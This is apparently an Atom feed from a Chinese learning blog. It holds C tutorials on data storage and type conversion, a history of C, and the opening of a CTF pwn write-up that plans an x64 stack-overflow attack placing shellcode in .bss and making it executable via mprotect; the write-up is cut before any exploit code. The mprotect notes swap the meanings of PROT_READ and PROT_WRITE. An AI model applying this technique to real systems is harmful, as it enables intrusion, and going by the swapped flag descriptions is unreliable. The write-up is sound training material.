1100</code>，因为是有符号的，所以最高位为符号位，为1表示是负数，那么<code>1111111111111111111111111111110</code>(去掉符号位的二进制)的十进制为<code>2147483646</code>，再加上符号，那么就是<code>-2147483646</code></li><li>如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为<code>2147483650</code></li></ul><p>之所以出现上述结果，原因在于格式符<code>%d</code>和<code>%u</code>：</p><ul><li><code>%d</code>是输出<strong>带符号</strong>十进制定点格式，也就是说机器通过<code>%d</code>将本无意义的二进制看作有符号的数值，那么第一位是符号位；</li><li><code>%u</code>是输出<strong>无符号</strong>十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制；</li></ul></blockquote><p><code>小节总结：</code></p><blockquote><ul><li>数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1])</li><li>数值是有符号还是无符号，看用户怎么使用</li></ul></blockquote><h4 id="font-color-blue2浮点数在内存的存储形式font"><a class="markdownIt-Anchor" href="#font-color-blue2浮点数在内存的存储形式font"></a> <font color="blue"><code>2.浮点数在内存的存储形式</code></font></h4><p>      首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">4.5</span>;<span class="comment">// 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="keyword">float</span> b = <span class="number">-4.5</span>;<span class="comment">// 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a:%f\n[*] b:%f\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下：</p><p><img src="/images/131-3.jpg" alt></p><p>      我们现在对比一下a和b的二进制形式和在计算机内存存放的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ab</span><br><span class="line">数值自身形式：00000000000000000000000000000100.110000000000000000000000000000100.1</span><br><span class="line">内存中的存储：0100000010010000000000000000000011000000100100000000000000000000</span><br></pre></td></tr></table></figure><blockquote><p>可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener"><code>IEEE-754</code></a>标准，我们可以知道浮点数是以如下方式进行存储的：</p></blockquote><p><img src="/images/131-4.png" alt></p><blockquote><p>既然我们知道了相关的存储方式<sup>[2]</sup>，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">   0x565561b0 &lt;+23&gt;:    add    eax,0x2e50</span><br><span class="line">   0x565561b5 &lt;+28&gt;:    fld    DWORD PTR [eax-0x1fe4]</span><br><span class="line">=&gt; 0x565561bb &lt;+34&gt;:    fstp   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561be &lt;+37&gt;:    fld    DWORD PTR [eax-0x1fe0]</span><br><span class="line">   0x565561c4 &lt;+43&gt;:    fstp   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561c7 &lt;+46&gt;:    fld    DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561ca &lt;+49&gt;:    fld    DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561cd &lt;+52&gt;:    sub    esp,0xc</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>fld</code>、<code>fstp</code>指令是没有接触过，那么这里就简单介绍一下：</p></blockquote><p><code>fld指令</code></p><blockquote><p><code>指令格式</code>：FLD　STReg/MemReal    （STReg是处理器堆栈寄存器ST(0)~ST(7)）</p><p><code>指令功能</code>：将<strong>浮点数据压入<a href="https://zh.wikipedia.org/zh-hans/%E8%BC%94%E5%8A%A9%E8%99%95%E7%90%86%E5%99%A8" target="_blank" rel="noopener">协处理器</a>的堆栈中</strong>。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push</p></blockquote><p><code>fst指令</code>：</p><blockquote><p><code>指令格式</code>：FST STReg/MemReal</p><p><code>指令功能</code>：将<strong>协处理器堆栈栈顶的数据传送到目标操作数</strong>中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。</p></blockquote><p><code>fstp指令</code></p><blockquote><p><code>指令格式</code>：FSTP STReg/MemReal</p><p><code>指令功能</code>：与FST相类似，所不同的是：指令FST执行完后，<strong>不进行堆栈的弹出操作</strong>，即：<strong>堆栈不发生变化</strong>，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。</p></blockquote><h3 id="font-color-navy0x01-数据常量font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-数据常量font"></a> <font color="navy"><code>0x01 数据常量</code></font></h3><h4 id="font-color-blue1字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue1字符和字符字面值font"></a> <font color="blue"><code>1.字符和字符字面值</code></font></h4><p>      从一个程序开始我们的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0x63</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a = %d(d) = %c(c)\n"</span>,a,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] c = %d(d) = %c(c)\n"</span>,c,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] d = %d(d) = %c(c)\n"</span>,d,d);</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b-1 = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] a = 97(d) = a(c)</span><br><span class="line">[*] b = 98(d) = b(c)</span><br><span class="line">[*] c = 99(d) = c(c)</span><br><span class="line">[*] d = 100(d) = d(c)</span><br><span class="line">[*] b-1 = 97(d) = a(c)</span><br></pre></td></tr></table></figure><p>      字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul><p><code>总结</code></p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><h3 id="font-color-navy0x02-数据类型转换font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-数据类型转换font"></a> <font color="navy"><code>0x02 数据类型转换</code></font></h3><h4 id="font-color-blue1类型提升font"><a class="markdownIt-Anchor" href="#font-color-blue1类型提升font"></a> <font color="blue"><code>1.类型提升</code></font></h4><p>      首先举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">short</span> a= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">b = a;</span><br><span class="line">c = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]          short a = %d(d) = %u(u)\n"</span>,a,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned short b = %d(d) = %u(u)\n"</span>,b,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned int c = %d(d) = %u(u)\n"</span>,c,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*]          short a = -1(d) = 4294967295(u)</span><br><span class="line">[*] unsigned short b = 65535(d) = 65535(u)</span><br><span class="line">[*] unsigned int c = -1(d) = 4294967295(u)</span><br></pre></td></tr></table></figure><p>      分析<code>printf的输出</code>，如下图：</p><p><img src="/images/131-5.png" alt></p><p><code>总结</code></p><blockquote><ul><li>有符号数按照有符号数的扩展规则（<strong>高位补符号位</strong>）扩展，无符号数按照无符号数的扩展规则（<strong>高位补0</strong>）扩展</li><li><strong>整型提升都解释为int</strong></li></ul></blockquote><h4 id="font-color-blue2类型降格font"><a class="markdownIt-Anchor" href="#font-color-blue2类型降格font"></a> <font color="blue"><code>2.类型降格</code></font></h4><p>      关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证</p><blockquote><ul><li>当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分</li><li>当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度</li></ul></blockquote><h4 id="font-color-blue3显示转换font"><a class="markdownIt-Anchor" href="#font-color-blue3显示转换font"></a> <font color="blue"><code>3.显示转换</code></font></h4><p>      显示转换的方法有：<code>强制类型转换</code></p><h4 id="font-color-blue4隐式转换font"><a class="markdownIt-Anchor" href="#font-color-blue4隐式转换font"></a> <font color="blue"><code>4.隐式转换</code></font></h4><p>      隐式转换的方法有：</p><p><code>赋值转换</code></p><blockquote><p>通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">3</span>,b;</span><br><span class="line">    <span class="keyword">short</span> i = <span class="number">4</span>,j;</span><br><span class="line">    j = a;<span class="comment">// int =&gt; short 类型降格</span></span><br><span class="line">    b = i;<span class="comment">// short =&gt; int 类型提升</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一元转换</code></p><blockquote><p>将短型数扩展成机器处理的长度</p></blockquote><p><code>二元转换</code></p><blockquote><p>按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级</p></blockquote><p><code>输出转换</code></p><blockquote><p>比如我们前面讲到的<code>printf()</code>的格式符<code>%d</code>，是将数据类型提升/降格为<code>signed int</code>类型</p></blockquote><h3 id="font-colornavy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-colornavy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/30395946" target="_blank" rel="noopener">计算机补码运算背后的数学原理是什么？</a></p><p>[2] <a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="noopener">浮点数的二进制表示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基本数据类型font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基本数据类型font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列一】 重新认识 C 语言</title>
    <link href="https://muzibing.github.io/2020/06/22/2020.06.22%EF%BC%88130%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/22/2020.06.22（130）/</id>
    <published>2020-06-21T16:00:00.000Z</published>
    <updated>2020-06-22T06:32:08.549Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy1c语言的历史font"><a class="markdownIt-Anchor" href="#font-color-navy1c语言的历史font"></a> <font color="navy"><code>1.C语言的历史</code></font></h3><p>      贝尔实验室的<code>Dennis Ritchie</code><font size="2">（1941－2011年）</font>为了给在<code>PDP-11</code>电脑上运行的Unix系统设计出一个系统级的编程语言，他在B语言的基础上创造了C语言，这是一门<code>高级编程语言</code>。</p><p><code>1969-1973年：早期的C语言</code></p><blockquote><ul><li><font size="2"><code>1969年</code>：<strong>基于 BCPL 创建 B</strong> ，以作为 Unix 的系统程序语言替代 PDP-7 汇编器</font></li><li><font size="2"><code>1971年</code>：于将 B 移植到<code>PDP-11</code> 时创建 NB （新“ B ”），也就是C语言的前身</font></li><li><font size="2"><code>1972年</code>：语言更名为 C</font></li><li><font size="2"><code>1973年</code>：Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上</font></li></ul></blockquote><p>      C语言源于<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL语言</a>，后者由<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>（Martin Richards）于1967年左右设计实现。BCPL是一门&quot;无类型&quot;的编程语言：它仅能操作一种数据类型，即<a href="https://zh.wikipedia.org/wiki/%E5%AD%97_(%E8%AE%A1%E7%AE%97%E6%9C%BA)" target="_blank" rel="noopener">机器字</a>（machine word）。1970年，肯·汤普逊为运行在<a href="https://zh.wikipedia.org/wiki/PDP-7" target="_blank" rel="noopener">PDP-7</a>上的首个Unix系统设计了一个精简版的BCPL，这个语言被称为<a href="https://zh.wikipedia.org/wiki/B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">B语言</a>，它也是无类型的。</p><p><br>      Unix最早运行在PDP-7上，是以<a href="https://zh.wikipedia.org/wiki/%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">汇编语言</a>写成，在PDP-11出现后，丹尼斯·里奇与<a href="https://zh.wikipedia.org/wiki/%E8%82%AF%C2%B7%E6%B1%A4%E6%99%AE%E9%80%8A" target="_blank" rel="noopener">肯·汤普逊</a>着手将<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a>移植到PDP-11上，无类型的语言在<code>PDP-11</code>上愈发显得不合适。PDP-11提供了多种不同规格大小的基本对象：一字节长的字符，两字节长的整型数以及四字节长的浮点数。B语言无法处理这些不同规格大小的对象，也没有提供单独的操作符去操作它们。</p><p><br>      C语言最初尝试通过向B语言中增加数据类型的想法来处理那些不同类型的数据。和大多数语言一样，在C中，每个对象都有一个类型以及一个值；类型决定了可用于值的操作的含义，以及对象占用的存储空间大小。</p><p><br>      1973年，Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上。</p><p><br><code>1974-至今：标准的C</code></p><blockquote><ul><li><font size="2"><code>1975年</code>：C语言开始移植到其他机器上使用</font></li><li><font size="2"><code>1978年</code>：<a href="https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87" target="_blank" rel="noopener">丹尼斯·里奇</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E8%90%8A%E6%81%A9%C2%B7%E6%9F%AF%E6%9E%97%E6%BC%A2" target="_blank" rel="noopener">布莱恩·柯林汉</a>合作出版了《<a href="https://zh.wikipedia.org/wiki/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80_(%E4%B9%A6)" target="_blank" rel="noopener">C程序设计语言</a>》( The C Programming Language )的第一版</font></li></ul></blockquote><hr><p>      下面给出一个C语言的发展时间轴：</p><p><img src="/images/130-1.jpg" alt></p><blockquote><ul><li><font size="2"><code>1954年-Fortran</code>：是世界上第一个被正式采用并流传至今的<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%9A%8E%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">高级编程语言</a>，由IBM开发完成</font></li><li><font size="2"><code>1958年-IAL(ALGOL)</code>：ALGOL被设计用来避免FORTRAN中一些已知的问题，最终引领了许多其它编程语言的兴起，包括<a href="https://zh.wikipedia.org/wiki/PL/I" target="_blank" rel="noopener">PL/I</a>、<a href="https://zh.wikipedia.org/wiki/Simula" target="_blank" rel="noopener">Simula</a>、<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL</a>、<a href="https://zh.wikipedia.org/wiki/B%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">B</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">Pascal</a>及<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">C</a></font></li><li><font size="2"><code>1958年-ALGOL58</code>：由IAL（国际代数语言，International Algebraic Language）改名而来。<a href="https://zh.wikipedia.org/wiki/ALGOL" target="_blank" rel="noopener">ALGOL</a>家族的第一个成员。它在1958年问世，<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>即是它的基础上开发而成</font></li><li><font size="2"><code>1960年-ALGOL60</code>：ALGOF60是一种面向问题的高级语言，它离硬件比较远，不宜用来编写系统程序。</font></li><li><font size="2"><code>1963年-CPL</code>：CPL是1963年剑桥大学发明的，CPL语言在<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>的基础上更接近硬件一些，但规模比较大，难以实现</font></li><li><font size="2"><code>1967年-BCPL</code>：是一种计算机程序设计语言，源自更早的<a href="https://zh.wikipedia.org/wiki/CPL_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">CPL</a>语言，1966年由剑桥大学的<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>所发展出来的。Richards试着移除了CPL中最复杂的组成，第一支BCPL compiler在<a href="https://zh.wikipedia.org/w/index.php?title=IBM_7094&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">IBM 7094</a>电脑中完成</font></li><li><font size="2"><code>1969年-B</code>：贝尔实验室的Ken Thompson（肯·汤普森） 对BCPL又做了改进，设计出了简单的且接近硬件的B语言，并用B语言写了第一个UNIX OS。</font></li><li><font size="2"><code>1971年-C</code>：贝尔实验室的另外一个人Dennis MacAlistair Ritchie（D.M.Ritchie - DM里奇）在B的基础上设计出了C语言。C 保持了B的优点（精炼、接近硬件），又克服了他的缺点（过于简单，数据无类型），至此C语言渐渐发展成为目前世界上最常用的编程语言之一。</font></li></ul></blockquote><h3 id="font-color-navy2重新学习c语言的理由font"><a class="markdownIt-Anchor" href="#font-color-navy2重新学习c语言的理由font"></a> <font color="navy"><code>2.重新学习C语言的理由</code></font></h3><p>      接触C语言是在大一上学期，这也是我第一次接触编程，那个时候对C语言的学习可真谓云里雾里，对于C语言中一些知识点不能够很好的知道其原理，比如<code>一个程序的变量被存放在哪里了？指针到底是个什么东西？</code>等等一系列问题，导致在学习过程中可谓困难重重，对计算机慢慢产生了畏难情绪。在经过一段时间的学习，我认为在学习C语言之前更应该先去学习计算机中的一些理念和想法，比如<code>可执行文件的加载过程；程序是如何被运行的；在程序运行过程中，栈扮演了什么样的角色？</code>等等，所以在简单的了解了这些原理以后，我决定再来重新学习C语言，以便彻底的了解其整个运行机制和原理。</p><p>      我参考的书籍有：《C语言程序设计语言》(第2版)和《C语言程序设计教程》(第3版)</p><h3 id="font-color-navy3学习计划font"><a class="markdownIt-Anchor" href="#font-color-navy3学习计划font"></a> <font color="navy"><code>3.学习计划</code></font></h3><p>     现在计划10期将C语言学完，每一期的计划如下：</p><blockquote><p>第一期：数据类型</p><p>第二期：流程控制</p><p>第三期：函数和程序结构</p><p>第四期：数组</p><p>第五期：指针（上）</p><p>第六期：指针（下）</p><p>第七期：结构（体）</p><p>第八期：链表</p><p>第九期：文件</p><p>第十期：总结</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy1c语言的历史font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1c语言的历史font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;1.C语言的历史&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Jarvis OJ-PWN】level5（x64下的栈溢出漏洞）</title>
    <link href="https://muzibing.github.io/2020/06/20/2020.06.20%EF%BC%88129%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/20/2020.06.20（129）/</id>
    <published>2020-06-19T16:00:00.000Z</published>
    <updated>2020-06-20T15:29:43.370Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/129-1.jpg" alt></p><h3 id="font-color-brown0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-相关知识font"></a> <font color="brown"><code>0x00 相关知识</code></font></h3><h4 id="font-color-navy1mprotect函数font"><a class="markdownIt-Anchor" href="#font-color-navy1mprotect函数font"></a> <font color="navy"><code>1.mprotect()函数</code></font></h4><p>      <code>mprotect()</code>函数可以修改调用进程内存页的保护属性。如果调用进程尝试以违反保护属性的方式访问该内存，则内核会发出一个<code>SIGSEGV</code>信号给该进程。</p><ul><li><p>函数原型：<code>int mprotect(const void *start, size_t len, int prot)</code></p></li><li><p>参数解释：</p><ul><li>start：需改写属性的内存中开始地址</li><li>len：需改写属性的内存长度</li><li>prot：需要修改为的指定值</li></ul></li><li><p>功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p></li><li><p><code>注意</code>：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>prot=7 是可读可写可执行</p></li></ul><h4 id="font-color-navy2_libc_csu_init通用gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2_libc_csu_init通用gadgetfont"></a> <font color="navy"><code>2.&lt;_libc_csu_init&gt;通用gadget</code></font></h4><blockquote><p>详情可以看一下我前面写过的一篇<a href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/">博文</a></p></blockquote><h3 id="font-color-brown0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-题目分析font"></a> <font color="brown"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file level3_x64 </span><br><span class="line">level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec level3_x64 </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Jarvis OJ/pwn/level5/level3_x64&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护，下面看一下伪代码</p></blockquote><p><img src="/images/129-2.png" alt></p><p><img src="/images/129-3.png" alt></p><blockquote><p>从上面的伪代码中很容易看出<code>vul()</code>函数存在着栈溢出漏洞，<code>buf</code>能输入的值要远远大于被分配的值，所以漏洞点在这。但是由于<code>system()</code>函数和<code>execve()</code>函数被禁用了，也就是说我们无法通过这两个函数执行shellcode，那么题目给了提示<code>请尝试使用mmap和mprotect完成本题。</code>，对于<code>mmap</code>函数还不太了解，所以在这里我们使用<code>mprotect()</code>函数，该函数可以修改调用进程内存页的保护属性，那么我们以将我们的shellcode放入<code>.bss</code>段中，然后将<code>.bss</code>段的权限修改为可执行，然后再跳转到<code>.bss</code>段执行shellcode，那么下面我们怎么将shellcode写入<code>.bss</code>段中呢？</p></blockquote><p><code>1.将mprotect的地址和shellcode写入.bss段中</code></p><p>      我们可以利用read函数将shellcode写入<code>.bss</code>段中，之所以也将<code>mprotect</code>函数的地址也写入<code>.bss</code>段中，是因为通用gadget中的<code>callq *(%r12,%rbx,8)</code>，如果rbx为0，那么这里就是将r12中表示的地址的值作为函数地址，比如<code>r12 = 1</code>，而地址1中的值为<code>2</code>，那么就是调用地址<code>2</code>中的函数，这一点需要注意</p><p><code>2.使用mprotect()函数修改.bss段的权限</code></p><p>      第一个参数start是<code>.bss</code>的起始地址，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p><code>3.执行shellcode</code></p><h3 id="font-color-brown0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-解题步骤font"></a> <font color="brown"><code>0x02 解题步骤</code></font></h3><h4 